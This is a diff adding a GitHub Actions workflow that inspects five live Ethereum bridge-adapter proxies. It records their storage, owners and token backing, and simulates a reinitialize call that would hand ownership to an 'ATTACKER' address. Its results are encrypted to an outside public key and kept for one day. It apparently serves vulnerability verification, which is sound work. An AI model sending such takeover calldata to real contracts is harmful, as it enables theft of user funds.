@@ -1,0 +1,161 @@
+name: Temporary encrypted runtime gate b7c9e4a1
+
+on:
+  pull_request:
+    branches:
+      - tmp/rt-b7c9e4a1
+    paths:
+      - '.rt-b7c9e4a1/**'
+
+permissions:
+  contents: read
+
+jobs:
+  gate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+          fetch-depth: 1
+
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: v1.7.1
+
+      - name: Collect read-only runtime evidence
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+
+          RPC=''
+          for candidate in \
+            'https://eth.llamarpc.com' \
+            'https://ethereum-rpc.publicnode.com' \
+            'https://cloudflare-eth.com'; do
+            if out="$(cast chain-id --rpc-url "$candidate" 2>/dev/null)" && test "$out" = '1'; then
+              RPC="$candidate"
+              break
+            fi
+          done
+          test -n "$RPC"
+
+          ATTACKER='0x1111111111111111111111111111111111111111'
+          IMPL_SLOT='0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
+          ADMIN_SLOT='0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103'
+
+          cat > evidence/ENV.txt <<EOF
+          rpc=$RPC
+          chain_id=$(cast chain-id --rpc-url "$RPC")
+          block_number=$(cast block-number --rpc-url "$RPC")
+          foundry=$(cast --version | head -n1)
+          EOF
+
+          json_rpc_call() {
+            local to="$1" data="$2" from="${3:-$ATTACKER}"
+            local payload
+            payload="$(jq -nc --arg to "$to" --arg data "$data" --arg from "$from" \
+              '{jsonrpc:"2.0",id:1,method:"eth_call",params:[{from:$from,to:$to,data:$data,gas:"0x989680"},"latest"]}')"
+            curl -fsS --max-time 30 -H 'content-type: application/json' --data "$payload" "$RPC"
+          }
+
+          record_call() {
+            local label="$1" address="$2" signature="$3"
+            shift 3
+            {
+              printf '\n### %s\naddress=%s\nsignature=%s\n' "$label" "$address" "$signature"
+              if out="$(cast call "$address" "$signature" "$@" --rpc-url "$RPC" 2>&1)"; then
+                printf 'status=PASS\n%s\n' "$out"
+              else
+                printf 'status=REVERT_OR_UNSUPPORTED\n%s\n' "$out"
+              fi
+            } >> evidence/CALLS.txt
+          }
+
+          ITEMS=(
+            'A1|0x8F45F7ACD4b9FC0B446902790F304d444dfF949b|0x2DC70fb75b88d2eB4715bc06E1595E6D97c34DFF'
+            'A2|0xb5bADA33542a05395d504a25885e02503A957Bb3|0x53E82ABbb12638F09d9e624578ccB666217a765e'
+            'A3|0x839dC0cFF5e263F56C9810560adF8Ea40E95Ab82|0x6d4f9f9f8f0155509ecd6Ac6c544fF27999845CC'
+            'A4|0x1E283d60537Dae87Bb63CFCae0Be574b50Ed0BBa|0x3DD459dE96F9C28e3a343b831cbDC2B93c8C4855'
+            'A5|0x8d09c41229f07ad098ffb5fad239dd87d2c131d4|0x2C24B57e2CCd1f273045Af6A5f632504C432374F'
+          )
+
+          : > evidence/CALLS.txt
+          printf 'id\tadapter\ttoken\timplementation_slot\tadmin_slot\tcode_bytes\n' > evidence/PROXIES.tsv
+
+          INNER="$(cast calldata 'reinitialize1(address,address)' "$ATTACKER" "$ATTACKER")"
+          OUTER="$(cast calldata 'reinitialize(bytes[])' "[$INNER]")"
+          printf 'inner=%s\nouter=%s\n' "$INNER" "$OUTER" > evidence/PROBE_CALLDATA.txt
+
+          for row in "${ITEMS[@]}"; do
+            IFS='|' read -r id adapter token <<< "$row"
+            code="$(cast code "$adapter" --rpc-url "$RPC")"
+            impl="$(cast storage "$adapter" "$IMPL_SLOT" --rpc-url "$RPC")"
+            admin="$(cast storage "$adapter" "$ADMIN_SLOT" --rpc-url "$RPC")"
+            bytes=$(( (${#code} - 2) / 2 ))
+            printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$id" "$adapter" "$token" "$impl" "$admin" "$bytes" >> evidence/PROXIES.tsv
+
+            record_call "$id.counter" "$adapter" 'globalInitializationCounter()(uint64)'
+            record_call "$id.owner" "$adapter" 'owner()(address)'
+            record_call "$id.token" "$adapter" 'token()(address)'
+            record_call "$id.endpoint" "$adapter" 'endpoint()(address)'
+            record_call "$id.delegate_raw" "$adapter" '0xc89e4361'
+            record_call "$id.adapter_token_balance" "$token" 'balanceOf(address)(uint256)' "$adapter"
+            record_call "$id.token_total_supply" "$token" 'totalSupply()(uint256)'
+            record_call "$id.token_total_assets" "$token" 'totalAssets()(uint256)'
+            record_call "$id.token_backing_difference" "$token" 'backingDifference()(bool,uint256)'
+            record_call "$id.token_paused" "$token" 'paused()(bool)'
+
+            for eid in 30101 30102 30110 30184 30243 30367; do
+              record_call "$id.peer.$eid" "$adapter" 'peers(uint32)(bytes32)' "$eid"
+            done
+
+            {
+              printf '\n### %s.reinitialize_probe\nadapter=%s\n' "$id" "$adapter"
+              json_rpc_call "$adapter" "$OUTER"
+              printf '\n'
+            } >> evidence/REINITIALIZE_PROBES.txt
+          done
+
+          sha256sum evidence/ENV.txt evidence/CALLS.txt evidence/PROXIES.tsv \
+            evidence/PROBE_CALLDATA.txt evidence/REINITIALIZE_PROBES.txt > evidence/PLAINTEXT_SHA256SUMS.txt
+
+      - name: Encrypt evidence
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > /tmp/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEArTaB5AwsbON5GAMBTnDP
+          FXJII5iQx90wzhW1ZWYdERbpw5eHKXIcnhP2gkGgmNbs4HN5DeoKU0QEMVdencnE
+          3qBBlow8G8uo6aFWSYgLmKdKFuILaEPvOcB/vuTHwEaLSVTRBEEFQ6FdGJ0suHsT
+          xDCu83f1uBw2box8YOI3ROoJWa4Q6F5SvWdFmLigYl+bayMFiWRZR3tWH5TajfYU
+          9Anz0CjVbVWSCPxTDZ5m9jMk1OXnH2zN3UMAeJ3W9x3riEfrwlXl+V8vFLiQt0K6
+          NcJ5mqyVO9HECB2m4/Zrd+ZmT2CD6a56Ak4O6Z68WcjmvKyBAM/iuEaH/0OAeLVt
+          Pghiv2cqj5fIJgK81I+C6NGIw6U3I4pgyl2405+VWx4XYYCJZQkJ/GkLz3gU0Cwr
+          /T9Ys3IrogX/RmMixbMZ791jm39Y7vSQdjfY22YxXI3fXv/LMyhknQRcdm0cHIWE
+          xOqQlCtlkfzPWRyg+QRU5g/bzp/Qgd5U8h9W/CZ0leChAgMBAAE=
+          -----END PUBLIC KEY-----
+          PEM
+          tar -C evidence -czf /tmp/plain.tar.gz \
+            ENV.txt CALLS.txt PROXIES.tsv PROBE_CALLDATA.txt REINITIALIZE_PROBES.txt PLAINTEXT_SHA256SUMS.txt
+          openssl rand -hex 32 > /tmp/key.hex
+          openssl enc -aes-256-cbc -salt -pbkdf2 -iter 200000 \
+            -in /tmp/plain.tar.gz -out evidence/runtime.tar.gz.enc -pass file:/tmp/key.hex
+          openssl pkeyutl -encrypt -pubin -inkey /tmp/public.pem \
+            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 \
+            -in /tmp/key.hex -out evidence/key.enc
+          rm -f evidence/ENV.txt evidence/CALLS.txt evidence/PROXIES.tsv evidence/PROBE_CALLDATA.txt \
+            evidence/REINITIALIZE_PROBES.txt evidence/PLAINTEXT_SHA256SUMS.txt
+          sha256sum evidence/runtime.tar.gz.enc evidence/key.enc > evidence/SHA256SUMS.txt
+          rm -f /tmp/plain.tar.gz /tmp/key.hex /tmp/public.pem
+
+      - name: Upload encrypted evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: rt-b7c9e4a1-${{ github.run_id }}
+          path: evidence/
+          if-no-files-found: error
+          retention-days: 1
